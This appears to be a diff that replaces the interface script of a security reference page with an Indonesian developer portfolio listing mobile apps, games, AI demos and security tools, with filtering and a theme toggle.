+    repo: "CalculatorVault", title: "CalculatorVault", cat: "mobile", year: 2026,
+    desc: "Brankas rahasia yang menyamar sebagai kalkulator biasa. Foto, video, dan dokumen dilindungi PIN, dienkripsi AES-256-GCM, dengan buka kunci biometrik dan auto-lock.",
+    tags: ["React Native", "Expo", "TypeScript", "AES-256-GCM"],
+  },
+  {
+    repo: "codingkidz", title: "CodingKidz", cat: "mobile", year: 2026,
+    desc: "Aplikasi Android untuk melatih logika coding anak 4–12 tahun lewat petualangan robot Bito di 9 dunia. Pemrograman blok drag & drop, sepenuhnya offline, tanpa iklan dan tanpa akun.",
+    tags: ["Kotlin", "Android", "F-Droid"],
+  },
+  {
+    repo: "DetectiveGame", title: "Detektif Batavia", cat: "game", year: 2026,
+    desc: "Game detektif point-and-click 2D berlatar Batavia 1926. Amati TKP, bantah saksi dengan bukti, dan tarik kesimpulan sendiri. Kasus #1: pencurian jam antik di Toko Jam Waktoe Emas.",
+    tags: ["JavaScript", "HTML", "CSS"],
+  },
+  {
+    repo: "cryptography-statis", title: "Cryptography Toolkit", cat: "security", year: 2026, demo: true,
+    desc: "Kumpulan 11 alat kriptografi yang berjalan 100% di browser dengan Web Crypto API — hashing, enkripsi, dan pembuatan kunci tanpa mengirim data ke server.",
+    tags: ["Next.js 16", "React 19", "Tailwind 4", "Web Crypto"],
+  },
+  {
+    repo: "emotion-recognition-web", title: "Emotion Recognition Web", cat: "ai", year: 2026, demo: true,
+    desc: "Deteksi emosi wajah real-time dari browser. Dua mesin AI: server (DeepFace + Flask) atau sepenuhnya di browser dengan face-api / TensorFlow.js sehingga gambar tidak dikirim ke mana pun.",
+    tags: ["Python", "Flask", "DeepFace", "TensorFlow.js"],
+  },
+  {
+    repo: "distilbert-sentiment-demo", title: "DistilBERT Sentiment Demo", cat: "ai", year: 2026,
+    desc: "Analisis sentimen yang berjalan sepenuhnya di browser memakai Transformers.js dan model DistilBERT SST-2 (8-bit, WebAssembly) di dalam Web Worker.",
+    tags: ["Transformers.js", "ONNX", "WebAssembly"],
+  },
+  {
+    repo: "Face_Emotion_Recognition", title: "Face Emotion Recognition", cat: "ai", year: 2026,
+    desc: "Deteksi 7 emosi wajah (FER-2013) secara real-time dari webcam, gambar, atau video dengan detektor wajah OpenCV YuNet dan model Keras 3.",
+    tags: ["Python", "OpenCV", "Keras 3"],
+  },
+  {
+    repo: "Steganalysis", title: "Steganalysis Web App", cat: "security", year: 2026,
+    desc: "Aplikasi web untuk mendeteksi steganografi LSB pada citra digital dengan membandingkan Chi-Square Attack dan RS Analysis.",
+    tags: ["Python", "Flask", "Image Processing"],
+  },
+  {
+    repo: "aplikasi-chat-realtime-javascript", title: "Obrolan — Chat Realtime", cat: "web", year: 2026,
+    desc: "Aplikasi chat realtime dengan channel publik, DM, reply, edit/hapus pesan, dan reaksi emoji. Frontend vanilla JS (ES modules) yang bisa di-install sebagai PWA.",
+    tags: ["Node.js", "Express 5", "Socket.IO", "MongoDB", "Docker"],
+  },
+  {
+    repo: "Tower-Defense", title: "Tower Defense", cat: "game", year: 2026, demo: true,
+    desc: "Game tower defense dengan 4 jenis tower dan 3 level upgrade. Proyek Unity asli kini punya versi web modern yang bisa dipasang sebagai PWA dan dimainkan offline.",
+    tags: ["TypeScript", "Vite", "Canvas", "Unity"],
+  },
+  {
+    repo: "SnakeGame", title: "Snake Game — Edisi Modern", cat: "game", year: 2026, demo: true,
+    desc: "Game Snake klasik yang ditulis ulang dengan pygame-ce, lengkap dengan CI dan versi yang bisa dimainkan langsung di browser.",
+    tags: ["Python", "pygame-ce", "GitHub Actions"],
+  },
+  {
+    repo: "Pong-Game", title: "Modern Neon Pong", cat: "game", year: 2026,
+    desc: "Pong dengan estetika neon/cyberpunk: efek partikel & trail, screen shake, layar start/pause/game over, dan kecepatan bola yang meningkat bertahap.",
+    tags: ["JavaScript", "HTML5 Canvas", "CSS3"],
+  },
+  {
+    repo: "indoliberty.site", title: "indoliberty.site", cat: "web", year: 2026,
+    desc: "Situs web organisasi yang dibangun dengan Next.js App Router dan TypeScript.",
+    tags: ["Next.js", "TypeScript", "React"],
+  },
+  {
+    repo: "Angry-Birds", title: "Angry Birds Replica", cat: "game", year: 2021,
+    desc: "Replika game ketapel dengan beberapa jenis burung yang punya kemampuan berbeda dan garis lintasan sebagai panduan arah.",
+    tags: ["Unity", "C#"],
+  },
+  {
+    repo: "Survival-Shooter", title: "Survival Shooter", cat: "game", year: 2021,
+    desc: "Game top-down shooter bertahan hidup yang dibuat dengan Unity.",
+    tags: ["Unity", "C#"],
+  },
+  {
+    repo: "nmap-scripts", title: "Auto Nmap Scanner", cat: "security", year: 2025,
+    desc: "Script Python untuk menjalankan berbagai mode scan Nmap secara otomatis, menyimpan hasil ke TXT/XML/GNMAP, dan mengekstrak port terbuka ke CSV.",
+    tags: ["Python", "Nmap"],
+  },
+  {
+    repo: "cryptotool", title: "cryptotool", cat: "security", year: 2025,
+    desc: "CLI Python untuk operasi kriptografi dasar: membuat kunci Fernet & RSA, enkripsi/dekripsi file, hash SHA-256, serta membuat dan memverifikasi tanda tangan digital.",
+    tags: ["Python", "CLI", "cryptography"],
+  },
+  {
+    repo: "pentest", title: "pentest", cat: "security", year: 2025,
+    desc: "Toolkit Python untuk pengujian aplikasi web milik sendiri: port scan, pengecekan XSS/CSRF, dan laporan HTML/JSON.",
+    tags: ["Python", "Web Security"],
+  },
+];
 
-  /* ── COPY PAYLOAD ── */
-  function copyPayload(btn){
-    const code=btn.closest('.payload-block').querySelector('.payload-code').innerText;
-    navigator.clipboard.writeText(code).then(()=>{
-      const orig=btn.textContent;
-      btn.textContent=currentLang==='en'?'COPIED!':'TERSALIN!';
-      btn.classList.add('copied');
-      toast(currentLang==='en'?'✓ copied to clipboard':'✓ disalin ke clipboard');
-      setTimeout(()=>{btn.textContent=orig;btn.classList.remove('copied');},2000);
-    });
-  }
+// Repositori yang lebih kecil / latihan
+const ARCHIVE = [
+  ["vhiweb_backend", "JavaScript", "REST API Express dengan autentikasi JWT untuk vendor & produk."],
+  ["slerate-sales-boost", "JavaScript", "Landing page Next.js."],
+  ["queenofcode", "JavaScript", "Proyek web Next.js."],
+  ["web_certif", "HTML / SCSS", "Website statis berbasis SCSS."],
+  ["freight_calculator", "Python", "Kalkulator ongkos kirim berbasis Django."],
+  ["instagram-comment-review", "Python", "Analisis sentimen & ringkasan komentar Instagram dengan Transformers."],
+  ["react_hacerrank_test", "React", "Latihan HackerRank: aplikasi pengurutan artikel."],
+  ["react_hook", "React", "Contoh penggunaan React Hooks."],
+  ["CSHARP-API-EXAMPLE", "C#", "Contoh API sederhana dengan C#."],
+  ["blog-php", "PHP", "Blog CRUD sederhana dengan PHP & MySQL."],
+  ["ToDoList-PHP", "PHP", "Aplikasi to-do list dengan PHP & MySQL."],
+  ["Web_Shop_Project", "PHP / JS", "Toko online dengan halaman login & registrasi."],
+  ["CallBackAPI-js", "JavaScript", "Contoh pola callback pada API JavaScript."],
+  ["REST-API-JS", "JavaScript", "Contoh REST API dengan JavaScript."],
+  ["sistemabsensikaryawanjava", "Java", "Sistem absensi karyawan (OOP)."],
+  ["sistempembayaranpolimorfismejava", "Java", "Sistem pembayaran dengan polimorfisme."],
+  ["example_OOP_Java", "Java", "Contoh konsep OOP di Java."],
+  ["Color_Recognition", "Python", "Pengenalan warna dari gambar."],
+  ["Matriks_With_CPP", "C++", "Operasi matriks dengan C++."],
+  ["Luas_Lingkaran_With_CPP", "C++", "Menghitung luas lingkaran dengan C++."],
+  ["KelilingLingkaran-With-CPP", "C++", "Menghitung keliling lingkaran dengan C++."],
+  ["portfolio", "HTML", "Versi awal website portfolio."],
+];
 
-  /* ── CHECKLIST (with persistence + progress meter) ── */
-  function toggleCheck(el){
-    el.classList.toggle('checked');
-    saveChecks();
-    updateCheckMeter();
-  }
-  function checkKey(el){
-    const list=[...document.querySelectorAll('.check-box')];
-    return list.indexOf(el);
-  }
-  function saveChecks(){
-    const state=[...document.querySelectorAll('.check-box')].map(c=>c.classList.contains('checked')?1:0);
-    try{localStorage.setItem('rt_checks',JSON.stringify(state));}catch(e){}
-  }
-  function restoreChecks(){
-    try{
-      const state=JSON.parse(localStorage.getItem('rt_checks')||'[]');
-      document.querySelectorAll('.check-box').forEach((c,i)=>{if(state[i])c.classList.add('checked');});
-    }catch(e){}
-  }
-  function updateCheckMeter(){
-    const all=document.querySelectorAll('.check-box');
-    if(!all.length)return;
-    const done=document.querySelectorAll('.check-box.checked').length;
-    const pct=Math.round(done/all.length*100);
-    document.querySelectorAll('.check-meter i').forEach(bar=>bar.style.width=pct+'%');
-    document.querySelectorAll('[data-check-count]').forEach(el=>el.textContent=done+'/'+all.length);
-  }
+const esc = s => String(s).replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
 
-  /* ── DORK FILTER ── */
-  function filterDorks(){
-    const q=document.getElementById('dorkSearch').value.toLowerCase();
-    document.querySelectorAll('#dorkBody tr').forEach(r=>{r.style.display=r.textContent.toLowerCase().includes(q)?'':'none';});
-  }
-
-  /* ══════════════════════════════════════════════════════
-     LANGUAGE SYSTEM
-  ══════════════════════════════════════════════════════ */
-  let currentLang='en';
-
-  function setLang(lang){
-    currentLang=lang;
-
-    // Toggle button states
-    document.querySelectorAll('.lang-btn').forEach(b=>{
-      b.classList.toggle('active', b.textContent.trim().toLowerCase()===lang);
-    });
-
-    // Translate all elements with data-en / data-id
-    document.querySelectorAll('[data-en]').forEach(el=>{
-      const val = lang==='en' ? el.getAttribute('data-en') : el.getAttribute('data-id');
-      if(!val) return;
-      // Elements that are purely text nodes (no children besides text)
-      if(el.children.length===0){
-        el.textContent=val;
-      } else {
-        // innerHTML for elements that may contain HTML entities
-        el.innerHTML=val;
-      }
-    });
-
-    // Translate placeholders
-    document.querySelectorAll('[data-placeholder-en]').forEach(el=>{
-      el.placeholder = lang==='en' ? el.getAttribute('data-placeholder-en') : el.getAttribute('data-placeholder-id');
-    });
-
-    // Update html lang attribute
-    document.documentElement.lang = lang;
-    try{localStorage.setItem('rt_lang',lang);}catch(e){}
-    buildCmdk();  // refresh command palette labels for the active language
-  }
-
-  /* ══════════════════════════════════════════════════════
-     SCROLL PROGRESS + BACK TO TOP
-  ══════════════════════════════════════════════════════ */
-  const progressEl=document.getElementById('progress');
-  const toTopEl=document.getElementById('toTop');
-  function onScroll(){
-    const h=document.documentElement;
-    const max=h.scrollHeight-h.clientHeight;
-    const pct=max>0?(h.scrollTop/max)*100:0;
-    progressEl.style.width=pct+'%';
-    toTopEl.classList.toggle('show',h.scrollTop>400);
-  }
-  window.addEventListener('scroll',onScroll,{passive:true});
-
-  /* ══════════════════════════════════════════════════════
-     SCROLL REVEAL (IntersectionObserver)
-  ══════════════════════════════════════════════════════ */
-  let io;
-  function revealScan(){
-    if(!io)return;
-    const active=document.querySelector('.section.active');
-    if(!active)return;
-    const items=active.querySelectorAll('.tool-card,.timeline-item,.checklist,.terminal,.payload-block,.alert-box,.dork-table,.risk-grid');
-    items.forEach((el,i)=>{
-      if(el.classList.contains('reveal'))return;
-      el.classList.add('reveal');
-      el.style.transitionDelay=Math.min(i*45,400)+'ms';
-      io.observe(el);
-    });
-  }
-
-  /* ══════════════════════════════════════════════════════
-     POINTER GLOW on cards
-  ══════════════════════════════════════════════════════ */
-  document.addEventListener('pointermove',e=>{
-    const card=e.target.closest('.tool-card');
-    if(!card)return;
-    const r=card.getBoundingClientRect();
-    card.style.setProperty('--mx',(e.clientX-r.left)+'px');
-    card.style.setProperty('--my',(e.clientY-r.top)+'px');
-  });
-
-  /* ══════════════════════════════════════════════════════
-     TOAST
-  ══════════════════════════════════════════════════════ */
-  let toastT;
-  function toast(msg){
-    const t=document.getElementById('toast');
-    t.textContent=msg;t.classList.add('show');
-    clearTimeout(toastT);toastT=setTimeout(()=>t.classList.remove('show'),1800);
-  }
-
-  /* ══════════════════════════════════════════════════════
-     COMMAND PALETTE  (Ctrl/⌘ + K)
-  ══════════════════════════════════════════════════════ */
-  const SECTIONS=[
-    ['overview','01','OVERVIEW','RINGKASAN'],['recon','02','RECON','RECON'],
-    ['dorks','03','GOOGLE DORKS','GOOGLE DORKS'],['payloads','04','PAYLOADS','PAYLOADS'],
-    ['network','05','NETWORK','JARINGAN'],['webapp','06','WEB APP','WEB APP'],
-    ['postex','07','POST-EXPLOIT','PASCA-EKSPLOIT'],['physical','08','PHYSICAL','FISIK'],
-    ['checklist','09','CHECKLIST','CHECKLIST']
+/* ---------- stats ---------- */
+(() => {
+  const langs = new Set(["JavaScript", "TypeScript", "Python", "Kotlin", "C#", "Java", "PHP", "C++"]);
+  const stats = [
+    [PROJECTS.length + ARCHIVE.length, "repo ditampilkan"],
+    [PROJECTS.length, "proyek unggulan"],
+    [PROJECTS.filter(p => p.demo).length, "demo live"],
+    [langs.size, "bahasa pemrograman"],
   ];
-  let cmdkSel=0, cmdkFiltered=SECTIONS;
-  const cmdk=document.getElementById('cmdk');
-  const cmdkInput=document.getElementById('cmdkInput');
-  const cmdkList=document.getElementById('cmdkList');
+  document.getElementById("stats").innerHTML = stats
+    .map(([n, l]) => `<div class="stat"><b>${n}</b><span>${l}</span></div>`).join("");
+})();
 
-  function buildCmdk(q=''){
-    const label=s=>currentLang==='en'?s[2]:s[3];
-    cmdkFiltered=SECTIONS.filter(s=>label(s).toLowerCase().includes(q.toLowerCase())||s[1].includes(q));
-    if(cmdkSel>=cmdkFiltered.length)cmdkSel=0;
-    cmdkList.innerHTML=cmdkFiltered.map((s,i)=>
-      `<div class="cmdk-item ${i===cmdkSel?'sel':''}" data-id="${s[0]}" onclick="cmdkGo('${s[0]}')">
-         <span class="ci">//</span><span>${label(s)}</span><span class="k">${s[1]}</span></div>`).join('')
-      || `<div class="cmdk-item">no match</div>`;
-  }
-  function openCmdk(){cmdk.classList.add('open');cmdkInput.value='';cmdkSel=0;buildCmdk();cmdkInput.focus();}
-  function closeCmdk(){cmdk.classList.remove('open');}
-  function cmdkGo(id){closeCmdk();showSection(id);}
-  cmdk.addEventListener('click',closeCmdk);
-  cmdkInput.addEventListener('input',()=>{cmdkSel=0;buildCmdk(cmdkInput.value);});
-  cmdkInput.addEventListener('keydown',e=>{
-    if(e.key==='ArrowDown'){e.preventDefault();cmdkSel=(cmdkSel+1)%cmdkFiltered.length;buildCmdk(cmdkInput.value);}
-    else if(e.key==='ArrowUp'){e.preventDefault();cmdkSel=(cmdkSel-1+cmdkFiltered.length)%cmdkFiltered.length;buildCmdk(cmdkInput.value);}
-    else if(e.key==='Enter'){e.preventDefault();if(cmdkFiltered[cmdkSel])cmdkGo(cmdkFiltered[cmdkSel][0]);}
-  });
+/* ---------- projects ---------- */
+let activeCat = "all";
+const grid = document.getElementById("grid");
+const chips = document.getElementById("chips");
+const search = document.getElementById("search");
+const empty = document.getElementById("empty");
 
-  /* ══════════════════════════════════════════════════════
-     GLOBAL KEYBOARD SHORTCUTS
-  ══════════════════════════════════════════════════════ */
-  document.addEventListener('keydown',e=>{
-    const typing=/^(INPUT|TEXTAREA)$/.test(document.activeElement.tagName);
-    if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='k'){e.preventDefault();openCmdk();return;}
-    if(e.key==='Escape'){closeCmdk();return;}
-    if(typing)return;
-    if(e.key==='/'){e.preventDefault();const d=document.getElementById('dorkSearch');if(d){showSection('dorks');setTimeout(()=>d.focus(),50);}return;}
-    if(e.key>='1'&&e.key<='9'){const s=SECTIONS[+e.key-1];if(s)showSection(s[0]);}
-  });
+function renderChips() {
+  const counts = PROJECTS.reduce((m, p) => (m[p.cat] = (m[p.cat] || 0) + 1, m), {});
+  const items = [["all", "Semua", PROJECTS.length], ...Object.entries(CATEGORIES).map(([k, v]) => [k, v, counts[k] || 0])];
+  chips.innerHTML = items.map(([k, label, n]) =>
+    `<button class="chip${k === activeCat ? " active" : ""}" data-cat="${k}">${esc(label)}<span class="n">${n}</span></button>`
+  ).join("");
+}
 
-  /* ══════════════════════════════════════════════════════
-     BOOT SEQUENCE
-  ══════════════════════════════════════════════════════ */
-  function runBoot(){
-    const lines=[
-      ['init secure shell','ok'],['loading tactical modules','ok'],
-      ['mounting reference database','ok'],['verifying authorized scope','ok'],
-      ['arming interface','ok']
-    ];
-    const box=document.getElementById('bootLines');
-    let i=0;
-    (function next(){
-      if(i<lines.length){
-        box.innerHTML+=`<div><span class="pend">[ .. ]</span> ${lines[i][0]} <span class="ok">[ OK ]</span></div>`;
-        i++;setTimeout(next,340);
-      }else{
-        box.innerHTML+=`<div class="ok">&gt; system ready<span class="boot-cursor"></span></div>`;
-      }
-    })();
-    setTimeout(()=>document.getElementById('boot').classList.add('done'),2300);
-  }
+function renderProjects() {
+  const q = search.value.trim().toLowerCase();
+  const list = PROJECTS.filter(p =>
+    (activeCat === "all" || p.cat === activeCat) &&
+    (!q || [p.title, p.repo, p.desc, ...p.tags].join(" ").toLowerCase().includes(q))
+  );
+  grid.innerHTML = list.map(p => `
+    <article class="card">
+      <div class="row"><span class="cat">${esc(CATEGORIES[p.cat])}</span><span class="year">${p.year}</span></div>
+      <h3><a href="${GH + p.repo}" target="_blank" rel="noopener">${esc(p.title)}</a></h3>
+      <p>${esc(p.desc)}</p>
+      <div class="tags">${p.tags.map(t => `<span class="tag">${esc(t)}</span>`).join("")}</div>
+      <div class="actions">
+        <a href="${GH + p.repo}" target="_blank" rel="noopener">Kode →</a>
+        ${p.demo ? `<a class="demo" href="${PAGES + p.repo}/" target="_blank" rel="noopener">Demo live ↗</a>` : ""}
+      </div>
+    </article>`).join("");
+  empty.style.display = list.length ? "none" : "block";
+}
 
-  /* ══════════════════════════════════════════════════════
-     INIT
-  ══════════════════════════════════════════════════════ */
-  window.addEventListener('DOMContentLoaded',()=>{
-    io=new IntersectionObserver(entries=>{
-      entries.forEach(en=>{if(en.isIntersecting){en.target.classList.add('in');io.unobserve(en.target);}});
-    },{threshold:.08});
+chips.addEventListener("click", e => {
+  const b = e.target.closest(".chip");
+  if (!b) return;
+  activeCat = b.dataset.cat;
+  renderChips();
+  renderProjects();
+});
+search.addEventListener("input", renderProjects);
 
-    // restore language
-    let savedLang='en';try{savedLang=localStorage.getItem('rt_lang')||'en';}catch(e){}
-    setLang(savedLang);
+/* ---------- archive ---------- */
+document.getElementById("archiveBody").innerHTML = ARCHIVE.map(([repo, lang, desc]) => `
+  <tr>
+    <td class="name"><a href="${GH + repo}" target="_blank" rel="noopener">${esc(repo)}</a></td>
+    <td class="lang col-lang">${esc(lang)}</td>
+    <td class="desc">${esc(desc)}</td>
+  </tr>`).join("");
 
-    // restore checklist
-    restoreChecks();updateCheckMeter();
+/* ---------- theme ---------- */
+const root = document.documentElement;
+try { const t = localStorage.getItem("theme"); if (t) root.dataset.theme = t; } catch (_) {}
+document.getElementById("themeBtn").addEventListener("click", () => {
+  const dark = root.dataset.theme
+    ? root.dataset.theme === "dark"
+    : matchMedia("(prefers-color-scheme: dark)").matches || !matchMedia("(prefers-color-scheme: light)").matches;
+  root.dataset.theme = dark ? "light" : "dark";
+  try { localStorage.setItem("theme", root.dataset.theme); } catch (_) {}
+});
 
-    // restore last section
-    let sec='overview';try{sec=localStorage.getItem('rt_section')||'overview';}catch(e){}
-    showSection(sec);
-
-    buildCmdk();
-    runBoot();
-    onScroll();
-  });
+document.getElementById("year").textContent = new Date().getFullYear();
+renderChips();
+renderProjects();
 </script>
 </body>
 </html>
